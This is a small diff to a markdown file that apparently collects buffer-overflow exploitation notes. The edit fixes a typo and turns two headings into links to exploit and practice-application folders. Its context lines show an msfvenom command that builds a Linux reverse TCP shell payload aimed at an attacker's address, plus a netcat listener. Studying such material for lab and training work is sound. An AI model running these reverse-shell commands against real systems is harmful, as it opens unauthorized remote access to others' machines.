@@ -249,9 +249,7 @@ msfvenom -p linux/x86/shell_reverse_tcp lhost=ip of attacker lport=port to conne
 nc -nlvp port 
 ```
 
-### buuferoverflow exploits
-####  (https://github.com/5bhuv4n35h/buffer_overflow/tree/master/buffer_exploits)
+### [bufferoverflow exploits](https://github.com/5bhuv4n35h/buffer_overflow/tree/master/buffer_exploits)
 
 
-### practice applications
-####  (https://github.com/5bhuv4n35h/buffer_overflow/tree/master/applications)
+### [practice applications](https://github.com/5bhuv4n35h/buffer_overflow/tree/master/applications)
